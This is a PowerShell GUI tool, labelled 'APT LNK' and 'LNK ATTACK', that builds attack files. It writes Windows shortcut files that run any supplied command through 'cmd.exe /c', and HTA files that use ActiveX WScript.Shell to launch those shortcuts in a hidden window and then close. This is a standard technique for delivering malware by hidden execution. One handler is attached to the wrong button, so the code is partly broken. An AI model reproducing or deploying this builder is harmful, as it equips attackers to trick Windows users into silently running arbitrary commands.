Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.Text = "APT LNK"
$form.Size = New-Object Drawing.Size(500, 600)
$form.Icon = New-Object system.drawing.icon("C:\Users\hooma\OneDrive\Desktop\living-off-the-land-circle.ico")
$form.BackColor = '#000000'

$label = New-Object Windows.Forms.Label
$label.Text = "LNK ATTACK"
$label.AutoSize = $true
$label.ForeColor = "Green"
$label.Location = New-Object System.Drawing.Point(130, 20)
$label.Font = New-Object Drawing.Font("Microsoft Sans Serif", 24, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$label2 = New-Object Windows.Forms.Label
$label2.Text = "Name File (*.lnk)"
$label2.ForeColor = "Gray"
$label2.AutoSize = $true
$label2.Location = New-Object System.Drawing.Point(180, 68)
$label2.Font = New-Object Drawing.Font("Microsoft Sans Serif", 10, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label2)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(150, 100)
$textBox.Size = New-Object System.Drawing.Size(180)
$textBox.BackColor = 'white'
$textBox.Font = New-Object Drawing.Font("Microsoft Sans Serif", 15, [Drawing.FontStyle]::Bold)
$form.Controls.Add($textBox)

$label3 = New-Object Windows.Forms.Label
$label3.Text = "Command (*.lnk)"
$label3.ForeColor = "Gray"
$label3.AutoSize = $true
$label3.Location = New-Object System.Drawing.Point(180, 210)
$label3.Font = New-Object Drawing.Font("Microsoft Sans Serif", 10, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label3)

$textBox1 = New-Object System.Windows.Forms.TextBox
$textBox1.Location = New-Object System.Drawing.Point(150, 240)
$textBox1.Size = New-Object System.Drawing.Size(180)
$textBox1.BackColor = 'white'
$textBox1.Font = New-Object Drawing.Font("Microsoft Sans Serif", 15, [Drawing.FontStyle]::Bold)
$form.Controls.Add($textBox1)

$label5 = New-Object Windows.Forms.Label
$label5.Text = "Name File (*.hta)"
$label5.ForeColor = "Gray"
$label5.AutoSize = $true
$label5.Location = New-Object System.Drawing.Point(180, 140)
$label5.Font = New-Object Drawing.Font("Microsoft Sans Serif", 10, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label5)

$textBox5 = New-Object System.Windows.Forms.TextBox
$textBox5.Location = New-Object System.Drawing.Point(150, 170)
$textBox5.Size = New-Object System.Drawing.Size(180)
$textBox5.BackColor = 'white'
$textBox5.Font = New-Object Drawing.Font("Microsoft Sans Serif", 15, [Drawing.FontStyle]::Bold)
$form.Controls.Add($textBox5)

$Button = New-Object System.Windows.Forms.Button
$Button.Location = New-Object System.Drawing.Size(140,300)
$Button.Size = New-Object System.Drawing.Size(200,50)
$Button.Font = New-Object Drawing.Font("Microsoft Sans Serif", 13, [Drawing.FontStyle]::Bold)
$Button.Padding = New-Object System.Windows.Forms.Padding(5)
$Button.Text = "CREATE LNK"
$Button.ForeColor = 'black'
$Button.BackColor = 'white'
$Button.Add_Click({
    $name = $textBox.text
    $command = $textBox1.text
    $Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\$name.lnk")
    $Shortcut.TargetPath = "cmd.exe"
    $Shortcut.Arguments = "/c $command"
    $Shortcut.Save()
})
$Form.Controls.Add($Button)

$Button2 = New-Object System.Windows.Forms.Button
$Button2.Location = New-Object System.Drawing.Size(140,360)
$Button2.Size = New-Object System.Drawing.Size(200,50)
$Button2.Font = New-Object Drawing.Font("Microsoft Sans Serif", 13, [Drawing.FontStyle]::Bold)
$Button2.Padding = New-Object System.Windows.Forms.Padding(5)
$Button2.Text = "CREATE HTA"
$Button2.ForeColor = 'black'
$Button2.BackColor = 'white'
$Button.Add_Click({
    $name = $textBox.text
    $hta = $textBox5.text
    $htmlContent = @"
<html>
<script>
var shell = new ActiveXObject("WScript.shell");
shell.run("$name.lnk", 0, true);
window.close();
</script>
</html>
"@
    Set-Content -Path "$hta.hta" -Value $htmlContent
})
$Form.Controls.Add($Button2)

[Windows.Forms.Application]::Run($form)